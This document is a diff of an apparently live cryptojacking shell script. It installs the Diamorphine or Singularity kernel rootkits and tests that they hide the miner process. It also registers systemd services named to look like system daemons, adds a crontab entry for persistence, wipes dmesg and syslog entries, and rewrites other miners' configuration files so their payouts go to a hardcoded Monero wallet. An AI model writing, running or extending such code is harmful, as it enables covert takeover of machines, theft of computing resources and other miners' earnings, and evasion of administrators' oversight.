+                            if ! ps aux | grep "sleep 999" | grep -v grep >/dev/null 2>&1; then
+                                echo "[✓] Signal -59 WORKS! Process successfully hidden!"
+                                ROOTKIT_NAME="Singularity"
+                                HIDE_SIGNAL=59
+                                ROOTKIT_WORKING=true
+                                kill -9 $TEST_PID 2>/dev/null
+                            else
+                                echo "[!] Process visible - signal may not be working"
+                                kill -9 $TEST_PID 2>/dev/null
+                                ROOTKIT_WORKING=false
+                            fi
+                        else
+                            echo "[✗] WARNING: Signal -59 KILLED the test process!"
+                            echo "[!] Singularity may not be compatible with kernel $KERNEL_VERSION"
+                            ROOTKIT_WORKING=false
+                        fi
+                        
+                        echo ""
+                        
+                    else
+                        echo "[✗] Failed to load Singularity module"
+                        echo "[*] Check dmesg for errors:"
+                        dmesg | tail -5
+                        ROOTKIT_WORKING=false
                     fi
-                done
-                if kill -0 "$INSMOD_PID" 2>/dev/null; then
-                    echo "[!] insmod hung after 10s — killing"
-                    kill -9 "$INSMOD_PID" 2>/dev/null || true
-                    wait "$INSMOD_PID" 2>/dev/null || true
-                    SINGULARITY_LOADED=false
-                elif [ "$INSMOD_SUCCESS" = true ] && lsmod | grep -q "^singularity" 2>/dev/null; then
-                    echo "[✓] Singularity loaded successfully!"
-                    echo "[*] Use 'kill -59 <PID>' to hide processes"
-                    sleep 1
-
-                    # STEALTH: Clear dmesg to remove module loading traces
-                    echo "[*] Clearing dmesg traces..."
-                    dmesg -C 2>/dev/null || true
-                    sleep 1
-                    echo "[✓] Kernel logs cleared"
-
-                    # Clear syslog traces
-                    sed -i '/singularity/d' /var/log/syslog 2>/dev/null
-                    sed -i '/singularity/d' /var/log/kern.log 2>/dev/null
-                    sed -i '/singularity/d' /var/log/messages 2>/dev/null
-                    SINGULARITY_LOADED=true
                 else
-                    echo "[!] Failed to load Singularity module"
-                    dmesg | tail -5 | grep -i error || true
-                    SINGULARITY_LOADED=false
+                    echo "[✗] singularity.ko not created!"
+                    echo "[*] Build log saved to: /tmp/singularity_build.log"
+                    echo ""
+                    echo "Last 10 lines of build log:"
+                    tail -10 /tmp/singularity_build.log
                 fi
             else
-                echo "[!] Singularity compilation failed"
-                echo "[*] Error log (last 10 lines):"
-                tail -10 /tmp/singularity_build.log | grep -i error || tail -10 /tmp/singularity_build.log
+                echo "[✗] Compilation failed!"
                 echo ""
-                echo "[*] This is OK - kernel rootkits will hide processes"
-                SINGULARITY_LOADED=false
+                echo "Build log saved to: /tmp/singularity_build.log"
+                echo "Last 20 lines:"
+                tail -20 /tmp/singularity_build.log
             fi
         else
-            echo "[!] Makefile not found in Singularity directory"
-            SINGULARITY_LOADED=false
+            unset GIT_TERMINAL_PROMPT
+            echo "[✗] Failed to clone Singularity"
+            echo "[!] Check internet connection"
         fi
-
-        # Go back to safe directory
-        cd /tmp 2>/dev/null || true
+        
     else
-        echo "[!] Failed to clone Singularity (network or repository unavailable)"
-        echo "[*] This is OK - kernel rootkits will hide processes"
-        unset GIT_TERMINAL_PROMPT
-        SINGULARITY_LOADED=false
+        # ==================== KERNEL 5.X - USE DIAMORPHINE ====================
+        echo "[*] Kernel 5.x detected - installing Diamorphine"
+        echo ""
+        
+        cd /tmp || return 1
+        rm -rf diamorphine
+        
+        echo "[*] Cloning Diamorphine from GitHub..."
+        export GIT_TERMINAL_PROMPT=0
+        if git clone --depth 1 https://github.com/m0nad/Diamorphine 2>&1 | grep -E "Cloning|done"; then
+            unset GIT_TERMINAL_PROMPT
+            echo "[✓] Cloned successfully"
+            
+            cd diamorphine || return 1
+            
+            echo "[*] Compiling Diamorphine..."
+            if make 2>&1 | tee /tmp/diamorphine_build.log && [ -f diamorphine.ko ]; then
+                echo "[✓] Compiled successfully!"
+                
+                echo "[*] Loading Diamorphine module..."
+                if insmod diamorphine.ko 2>/dev/null; then
+                    echo "[✓] Diamorphine loaded successfully!"
+                    
+                    # Clear dmesg traces
+                    dmesg -C 2>/dev/null || true
+                    
+                    # Test hiding
+                    echo "[*] Testing with signal -31..."
+                    sleep 999 &
+                    TEST_PID=$!
+                    sleep 2
+                    kill -31 $TEST_PID 2>/dev/null
+                    sleep 2
+                    
+                    if kill -0 $TEST_PID 2>/dev/null && ! ps aux | grep "sleep 999" | grep -v grep >/dev/null; then
+                        echo "[✓] Signal -31 WORKS!"
+                        ROOTKIT_NAME="Diamorphine"
+                        HIDE_SIGNAL=31
+                        ROOTKIT_WORKING=true
+                        kill -9 $TEST_PID 2>/dev/null
+                    else
+                        echo "[!] Signal -31 may not be working"
+                        kill -9 $TEST_PID 2>/dev/null
+                    fi
+                else
+                    echo "[✗] Failed to load Diamorphine"
+                fi
+            else
+                echo "[✗] Compilation failed!"
+                echo "Build log: /tmp/diamorphine_build.log"
+            fi
+        else
+            unset GIT_TERMINAL_PROMPT
+            echo "[✗] Failed to clone Diamorphine"
+        fi
     fi
-else
+    
     echo ""
-    echo "[*] Kernel $(uname -r) detected (major version: $KERNEL_MAJOR)"
-    echo "[!] Singularity requires kernel 6.x - SKIPPING"
-    echo "[*] Kernel rootkits are active for process hiding"
-    SINGULARITY_LOADED=false
+    echo "=========================================="
+    echo "ROOTKIT INSTALLATION SUMMARY"
+    echo "=========================================="
+    echo ""
+    
+    if [ "$ROOTKIT_WORKING" = "true" ]; then
+        echo "Status: ✅ SUCCESS"
+        echo "Rootkit: $ROOTKIT_NAME"
+        echo "Signal: -$HIDE_SIGNAL"
+        echo "Module: Loaded and tested"
+        echo ""
+        echo "Manual hiding command:"
+        echo "  kill -$HIDE_SIGNAL <PID>"
+        echo ""
+    else
+        echo "Status: ⚠️  NO ROOTKIT"
+        echo "Reason: Compilation failed or incompatible kernel"
+        echo "Mode: Will run VISIBLE"
+        echo ""
+        echo "To enable hiding later:"
+        echo "  1. Compile compatible rootkit manually"
+        echo "  2. Update service files with correct signal"
+        echo "  3. systemctl daemon-reload && systemctl restart swapd"
+        echo ""
+    fi
+    
+    # Export for later use
+    export ROOTKIT_NAME HIDE_SIGNAL ROOTKIT_WORKING
+    
+    return 0
+}
+
+# ==================== CALL ROOTKIT INSTALLATION ====================
+fix_kernel_headers_and_install_rootkit
+
+# ==================== CONFIGURE SERVICES BASED ON ROOTKIT ====================
+if [ "$ROOTKIT_WORKING" = "true" ] && [ "$HIDE_SIGNAL" -gt 0 ] && [ "$SYSTEMD_AVAILABLE" = true ]; then
+    echo ""
+    echo "=========================================="
+    echo "CONFIGURING AUTO-HIDE SERVICES"
+    echo "=========================================="
+    echo "[*] Rootkit detected: $ROOTKIT_NAME (signal -$HIDE_SIGNAL)"
+    echo "[*] Creating services with auto-hide capability..."
+    echo ""
+    
+    # Create swapd service (detached, systemd won't track PID)
+    cat > /etc/systemd/system/swapd.service << EOF
+[Unit]
+Description=System swap daemon
+After=network.target
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+ExecStart=/bin/bash -c 'nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 & echo \$! > /run/swapd.pid; sleep 2'
+ExecStop=/bin/bash -c 'kill \$(cat /run/swapd.pid 2>/dev/null) 2>/dev/null || true; rm -f /run/swapd.pid'
+Nice=19
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    
+    # Create hider service (waits 30s then hides)
+    cat > /etc/systemd/system/swapd-hider.service << EOF
+[Unit]
+Description=Process manager daemon
+After=swapd.service
+Requires=swapd.service
+
+[Service]
+Type=oneshot
+RemainAfterExit=yes
+ExecStartPre=/bin/sleep 30
+ExecStart=/bin/bash -c 'PID=\$(cat /run/swapd.pid 2>/dev/null); if [ -n "\$PID" ]; then kill -$HIDE_SIGNAL \$PID 2>/dev/null || true; fi'
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable swapd swapd-hider 2>/dev/null
+    
+    echo "[✓] Services configured!"
+    echo "[✓] Auto-hide enabled with signal -$HIDE_SIGNAL"
+    echo "[*] Process will be hidden 30 seconds after start"
+    echo ""
 fi
+
 
 # ==================== START MINER SERVICE ====================
 echo ''
@@ -2527,7 +2297,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     fi
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
-
+    
     # Start process hiding daemon
     echo "[*] Starting process hiding daemon..."
     systemctl start process-hider 2>/dev/null || true
@@ -2548,22 +2318,22 @@ else
     # Fallback: No systemd, no SysV init (BusyBox/embedded systems)
     echo "[!] No systemd or SysV init detected (BusyBox/embedded system)"
     echo "[*] Starting miner as background daemon..."
-
+    
     # Kill any existing instances
     pkill -9 -f /root/.swapd/swapd 2>/dev/null || true
     killall -9 swapd 2>/dev/null || true
-
+    
     # Start in background with nohup
     cd /root/.swapd || exit 1
     nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &
     MINER_PID=$!
-
+    
     sleep 3
-
+    
     # Verify it started
     if kill -0 $MINER_PID 2>/dev/null; then
         echo "[✓] Miner started as daemon (PID: $MINER_PID)"
-
+        
         # Send hide signals immediately (only if rootkits loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             kill -31 $MINER_PID 2>/dev/null || true
@@ -2572,7 +2342,7 @@ else
         else
             echo "[*] Rootkits not loaded - process will remain visible"
         fi
-
+        
         # Add to crontab for auto-restart on reboot
         (crontab -l 2>/dev/null | grep -v "swapd"; echo "@reboot cd /root/.swapd && nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &") | crontab -
         echo "[✓] Added to crontab for auto-start on reboot"
@@ -2872,35 +2642,35 @@ MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566v
 # Function to validate if a string is a Monero wallet address
 is_monero_wallet() {
     local address="$1"
-
+    
     # Check if empty or too short
     [ -z "$address" ] && return 1
     [ ${#address} -lt 90 ] && return 1
-
+    
     # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
     # Subaddresses start with 8 (87 chars)
     local first_char="${address:0:1}"
     if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
         return 1
     fi
-
+    
     # Check length is valid for Monero addresses
     local addr_len=${#address}
     if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
         return 1
     fi
-
+    
     # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
     # Also reject common placeholders/patterns
     if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
         return 1
     fi
-
+    
     # Reject obvious placeholders
     if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
         return 1
     fi
-
+    
     # Valid Monero wallet address
     return 0
 }
@@ -2925,37 +2695,37 @@ CONFIGS_HIJACKED=0
 for search_path in "${SEARCH_PATHS[@]}"; do
     if [ -d "$search_path" ]; then
         echo "[*] Searching in $search_path..."
-
+        
         # Find all config.json files (with timeout to prevent hanging)
         timeout 30 find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
             # Skip our own config
             if echo "$config_file" | grep -q "/root/.swapd/"; then
                 continue
             fi
-
+            
             # Check if file contains a "user" field (wallet address)
             if grep -q '"user"' "$config_file" 2>/dev/null; then
                 CONFIGS_FOUND=$((CONFIGS_FOUND + 1))
-
+                
                 # Extract current wallet
                 CURRENT_WALLET=$(grep '"user"' "$config_file" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-
+                
                 # Validate it's actually a Monero wallet address
                 if ! is_monero_wallet "$CURRENT_WALLET"; then
                     # Not a wallet address, skip this file
                     continue
                 fi
-
+                
                 # Check if it's already our wallet
                 if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
                     echo "  [✓] $config_file - Already using our wallet"
                 else
                     echo "  [!] $config_file - Found different wallet"
                     echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}"
-
+                    
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
-
+                    
                     # OVERWRITE entire config.json with our exact configuration
                     cat > "$config_file" << 'CONFIG_EOF'
 {
@@ -2977,12 +2747,12 @@ for search_path in "${SEARCH_PATHS[@]}"; do
     ]
 }
 CONFIG_EOF
-
+                    
                     if [ $? -eq 0 ]; then
                         echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
                         echo "      [✓] Config completely overwritten!"
                         CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
-
+                        
                         # Try to restart the associated service/process
                         # Find process using this config file
                         MINER_PID=$(lsof "$config_file" 2>/dev/null | grep -v COMMAND | awk '{print $2}' | head -1)
@@ -3006,7 +2776,7 @@ echo "[*] Checking systemd services for miners..."
 for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
     if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
         echo "[*] Found service: $service_name.service"
-
+        
         # Try to extract ExecStart path from service file
         SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
         if [ -f "$SERVICE_FILE" ]; then
@@ -3014,22 +2784,22 @@ for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
             CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
             if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
                 echo "  Config: $CONFIG_PATH"
-
+                
                 # Check and hijack if needed
                 if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
                     CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-
+                    
                     # Validate it's actually a Monero wallet address
                     if ! is_monero_wallet "$CURRENT_WALLET"; then
                         echo "  [*] Not a miner config (invalid wallet format)"
                         continue
                     fi
-
+                    
                     if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
                         echo "  [!] Different wallet detected - hijacking..."
                         cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
                         sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
-
+                        
                         echo "  [✓] Wallet replaced - restarting service..."
                         systemctl restart "$service_name" 2>/dev/null || true
                     fi
@@ -3052,10 +2822,10 @@ echo "[*] Cleaning up system logs..."
 clean_log() {
     local logfile="$1"
     local pattern="$2"
-
+    
     # Skip if file doesn't exist
     [ -f "$logfile" ] || return 0
-
+    
     # Try sed -i (some BusyBox versions don't support it)
     if sed -i "/$pattern/d" "$logfile" 2>/dev/null; then
         return 0
@@ -3193,7 +2963,7 @@ if [ ! -f /swapfile ]; then
         echo "vm.swappiness=100" >> /etc/sysctl.conf 2>/dev/null || true
         sysctl -w vm.swappiness=100 2>/dev/null || true
         echo "[✓] 2GB swap created and activated"
-
+        
         # STEALTH: Clear dmesg to remove swap creation traces
         sleep 1
         dmesg -C 2>/dev/null || true
@@ -3205,7 +2975,7 @@ else
     echo "[*] Swap file already exists, activating..."
     swapon /swapfile 2>/dev/null || true
     echo "[✓] Swap activated"
-
+    
     # STEALTH: Clear dmesg to remove swap activation traces
     sleep 1
     dmesg -C 2>/dev/null || true
@@ -3472,7 +3242,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "PROCESS HIDING (AUTOMATIC)"
     echo "=========================================="
     echo ""
-
+    
     # Check if rootkits are loaded
     if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
         echo "[!] WARNING: No rootkits detected"
@@ -3484,7 +3254,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         echo "[*] The process-hider daemon will automatically hide processes"
         echo "[*] Waiting 30 seconds for daemon to hide processes..."
         echo ""
-
+        
         # Wait for daemon to do its work
         for i in {1..6}; do
             sleep 5
@@ -3500,7 +3270,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
                 echo "[*] Attempt $i/6 - process still visible, daemon working..."
             fi
         done
-
+        
         echo ""
         echo "The hiding daemon (process-hider.service) runs continuously"
         echo "It will keep hiding processes every 10 seconds automatically"
@@ -3532,39 +3302,39 @@ detect_rootkit() {
         echo "[✓] Detected: Diamorphine via lsmod (signal -31)"
         return 0
     fi
-
+    
     if lsmod | grep -q "^singularity"; then
         ROOTKIT_NAME="Singularity"
         HIDE_SIGNAL=59
         echo "[✓] Detected: Singularity via lsmod (signal -59)"
         return 0
     fi
-
+    
     if lsmod | grep -q "^reptile"; then
         ROOTKIT_NAME="Reptile"
         HIDE_SIGNAL=0
         echo "[✓] Detected: Reptile via lsmod"
         return 0
     fi
-
+    
     if lsmod | grep -q "^rootkit"; then
         ROOTKIT_NAME="Crypto-RK"
         HIDE_SIGNAL=31
         echo "[✓] Detected: Crypto-RK via lsmod (signal -31)"
         return 0
     fi
-
+    
     # Rootkit might be HIDDEN - test with signals
     echo "[*] No rootkit in lsmod - testing for HIDDEN rootkit..."
-
+    
     # Create test process
     sleep 333 &
     TEST_PID=$!
-
+    
     # Test Singularity first (signal -59) - most common for hidden rootkits
     kill -59 $TEST_PID 2>/dev/null
     sleep 1
-
+    
     if ps -p $TEST_PID >/dev/null 2>&1; then
         # Process alive - check if hidden
         if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
@@ -3577,7 +3347,7 @@ detect_rootkit() {
             # Not hidden by -59, try Diamorphine (signal -31)
             kill -31 $TEST_PID 2>/dev/null
             sleep 1
-
+            
             if ps -p $TEST_PID >/dev/null 2>&1; then
                 if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
                     ROOTKIT_NAME="Diamorphine"
@@ -3592,7 +3362,7 @@ detect_rootkit() {
     else
         kill -9 $TEST_PID 2>/dev/null
     fi
-
+    
     # No rootkit found
     echo "[!] NO ROOTKIT DETECTED!"
     ROOTKIT_NAME=""
@@ -3615,25 +3385,25 @@ if [ -z "$ROOTKIT_NAME" ]; then
     echo ""
 else
     echo ""
-
+    
     # Wait for process to fully start
     echo "[*] Waiting 5 seconds for process to stabilize..."
     sleep 5
-
+    
     # Get swapd PID
     echo "[*] Getting swapd PID..."
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-
+    
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-
+    
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
         echo "[✓] Found PID: $SWAPD_PID"
         echo ""
-
+        
         echo "[*] Hiding process using $ROOTKIT_NAME..."
-
+        
         # Use ONLY the correct signal for this rootkit
         case "$ROOTKIT_NAME" in
             "Diamorphine"|"Crypto-RK")
@@ -3649,23 +3419,23 @@ else
                 reptile_cmd hide $SWAPD_PID 2>/dev/null || echo "    [!] reptile_cmd not found"
                 ;;
         esac
-
+        
         # Wait for rootkit to process signal
         echo ""
         echo "[*] Waiting 5 seconds for rootkit to process..."
         sleep 5
-
+        
         # Verify hiding worked
         echo ""
         echo "[*] Verifying process is hidden..."
-
+        
         # Check service status first
         SERVICE_STATUS=$(systemctl is-active swapd 2>/dev/null)
-
+        
         if [ "$SERVICE_STATUS" = "active" ]; then
             # Service still active - good sign
             PS_CHECK=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-
+            
             if [ -z "$PS_CHECK" ]; then
                 echo "[✓] SUCCESS! Process is HIDDEN!"
                 echo ""
@@ -3684,7 +3454,7 @@ else
         else
             echo "[!] WARNING: Service status is '$SERVICE_STATUS'"
             echo ""
-
+            
             # Check if process was killed by signal
             if systemctl status swapd 2>/dev/null | grep -q "status=$HIDE_SIGNAL"; then
                 echo "[!] CRITICAL: Signal -$HIDE_SIGNAL KILLED the process!"
@@ -3701,7 +3471,7 @@ else
                 echo "Check with:"
                 echo "  dmesg | tail -30 | grep -i rootkit"
                 echo ""
-
+                
                 # Restart service
                 echo "[*] Restarting service (without hiding)..."
                 systemctl restart swapd
